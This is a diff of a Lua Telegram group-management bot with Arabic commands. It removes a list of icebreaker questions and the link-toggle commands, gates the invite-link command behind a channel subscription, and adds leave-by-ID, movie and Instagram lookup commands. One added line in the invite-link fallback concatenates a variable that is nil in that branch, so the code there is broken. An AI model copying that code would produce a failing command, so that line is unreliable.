-"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
-" آخر غلطات عمرك؟ ", 
-" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
-" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
-" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
-" قدوتك من الأجيال السابقة؟ ", 
-" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
-"أكثر حيوان تخاف منه؟ ", 
-" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
-" إيموجي يعبّر عن مزاجك الحالي؟ ", 
-" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
-"أكثر شيء أسعدك اليوم؟ ", 
-"اي رايك في اليكس وعدم سلكانه؟ ", 
-"ما هو أفضل حافز للشخص؟ ", 
-"ما الذي يشغل بالك في الفترة الحالية؟", 
-"آخر شيء ندمت عليه؟ ", 
-"شاركنا صورة احترافية من تصويرك؟ ", 
-"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
-"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
-"نصيحه تبدا ب -لا- ؟ ", 
-"كتاب أو رواية تقرأها هذه الأيام؟ ", 
-"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
-"يوم لا يمكنك نسيانه؟ ", 
-"شعورك الحالي في جملة؟ ", 
-"كلمة لشخص بعيد؟ ", 
-"صفة يطلقها عليك الشخص المفضّل؟ ", 
-"أغنية عالقة في ذهنك هاليومين؟ ", 
-"أكلة مستحيل أن تأكلها؟ ", 
-"كيف قضيت نهارك؟ ", 
-"تصرُّف ماتتحمله؟ ", 
-"موقف غير حياتك؟ ", 
-"اكثر مشروب تحبه؟ ", 
-"القصيدة اللي تأثر فيك؟ ", 
-"متى يصبح الصديق غريب ", 
-"وين نلقى السعاده برايك؟ ", 
-"تاريخ ميلادك؟ ", 
-"قهوه و لا شاي؟ ", 
-"من محبّين الليل أو الصبح؟ ", 
-"حيوانك المفضل؟ ", 
-"كلمة غريبة ومعناها؟ ", 
-"كم تحتاج من وقت لتثق بشخص؟ ", 
-"اشياء نفسك تجربها؟ ", 
-"يومك ضاع على؟ ", 
-"كل شيء يهون الا ؟ ", 
-"اسم ماتحبه ؟ ", 
-"وقفة إحترام للي إخترع ؟ ", 
-"أقدم شيء محتفظ فيه من صغرك؟ ", 
-"كلمات ماتستغني عنها بسوالفك؟ ", 
-"وش الحب بنظرك؟ ", 
-"حب التملك في شخصِيـتك ولا ؟ ", 
-"تخطط للمستقبل ولا ؟ ", 
-"موقف محرج ماتنساه ؟ ", 
-"من طلاسم لهجتكم ؟ ", 
-"اعترف باي حاجه ؟ ", 
-"عبّر عن مودك بصوره ؟ ", 
-"اسم دايم ع بالك ؟ ", 
-"اشياء تفتخر انك م سويتها ؟ ", 
-" لو بكيفي كان ؟ ", 
-} 
-send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
-return false 
-end
 if text == "توكن البوت" or text == 'التوكن' then
 if not SudoBot(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
@@ -10256,19 +10222,6 @@ database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_u
 return false
 end
 end
-if text == "تفعيل رابط" or text == 'تفعيل الرابط' then
-if Mod(msg) then  
-database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
-send(msg.chat_id_, msg.id_," 🟢┇ تم تفعيل الرابط") 
-return false  
-end
-end
-if text == "تعطيل رابط" or text == 'تعطيل الرابط' then
-if Mod(msg) then  
-database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
-send(msg.chat_id_, msg.id_," 🔴┇ تم تعطيل الرابط") 
-return false end
-end
 if text == 'بوت' or text == 'البوت' then
 local TEXT_BOT = database:get(bot_id..'TEXT_BOT')
 if TEXT_BOT then 
@@ -10287,7 +10240,6 @@ end,nil)
 end
 end
 ---------------------
-
 if text == "تفعيل صورتي" or text == 'تفعيل الصوره' then
 if Constructor(msg) then  
 database:set(bot_id.."my_photo:status"..msg.chat_id_,true) 
@@ -10302,27 +10254,31 @@ send(msg.chat_id_, msg.id_," ☉┇ تم تعطيل الصوره")
 return false end
 end
 if text == "الرابط" then 
-local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_)
-if not status_Link then
-send(msg.chat_id_, msg.id_,"⚠️┇ الرابط معطل") 
-return false  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n☉┇ يرجى الاشتراك بالقناه اولا \n☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
 end
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
 local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
 if link then                              
-send(msg.chat_id_,msg.id_,'🌐┇ 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n '..ta.title_..'\n'..link..'')                          
-else                
+send(msg.chat_id_,msg.id_,'☉┇ رابط المجموعه\n\n'..link..'')                          
+else
 local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
 if linkgpp.ok == true then 
-linkgp = '🌐┇ 𝙻𝙸𝙽𝙺 𝙶𝚁𝙾𝚄𝙿.\n━ ━ ━ ━ ━ ━ ━ ━\n '..ta.title_..'\n'..linkgpp.result..''
+linkgp = '☉┇ رابط المجموعه\n\n'..link..''
 else
-linkgp = '♻️┇ لا يوجد رابط ارسل ضع رابط'
+linkgp = '☉┇ ليس لدي صلاحيه دعوه المستخدمين'
 end  
 send(msg.chat_id_, msg.id_,linkgp)              
 end      
 end,nil)
 end
-if text == 'مسح الرابط' or text == 'مسح الرابط' then
+if text == 'مسح الرابط' or text == 'تغير الرابط' then
 if Mod(msg) then     
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -12420,7 +12376,17 @@ end
 end
 
 -------------------------------
-if text == ""..(database:get(bot_id..'Name:Bot') or 'باور').."غادر" or text == 'بوت غادر' then  
+if text and text:match("^غادر (-%d+)$") then
+local GP_ID = {string.match(text, "^(غادر) (-%d+)$")}
+if DevBot(msg) and not database:get(bot_id.."Left:Bot"..msg.chat_id_) then 
+tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
+send(msg.chat_id_, msg.id_,"✫:  تم مغادرة المجموعه") 
+send(GP_ID[2], 0,"✫:  تم مغادرة المجموعه بامر من مطور البوت") 
+database:srem(bot_id.."Chek:Groups",GP_ID[2])  
+return false 
+end
+end
+if text == "غادر" then  
 if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
 send(msg.chat_id_, msg.id_,' ☉┇ تم مغادرة الجروب') 
@@ -14716,6 +14682,34 @@ i = i + 1
 t = t..i.."-  `"..v.."` \n"
 end
 send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n ⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
+end
+if text and text:match("^فلم (.*)$") and database:get(bot_id.."movie_bot"..msg.chat_id_) == "open" then
+local Textm = text:match("^فلم (.*)$")
+data,res = https.request('https://boyka-api.ml/movie.php?serch='..URL.escape(Textm)..'')
+if res == 200 then
+getmo = json:decode(data)
+if getmo.Info == true then
+local Text ='قصه الفلم'..getmo.info
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = 'مشاهده الفلم بجوده 240',url=getmo.sd}},
+{{text = 'مشاهده الفلم بجوده 480', url=getmo.Web},{text = 'مشاهده الفلم بجوده 1080', url=getmo.hd}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+end
+end
+if text and text:match("^انستا (.*)$") then
+local Textni = text:match("^انستا (.*)$")
+data,res = https.request('https://boyka-api.ml/infoInstagram.php?username='..URL.escape(Textni)..'')
+if res == 200 then
+muaed = json:decode(data)
+if muaed.Info == true then
+local msg_id = msg.id_/2097152/0.5
+SendP(msg.chat_id_, msg_id,muaed.ph, muaed.info) 
+end
+end
 end
 if text and text:match("^زخرفه (.*)$") then
 local TextZhrfa = text:match("^زخرفه (.*)$")
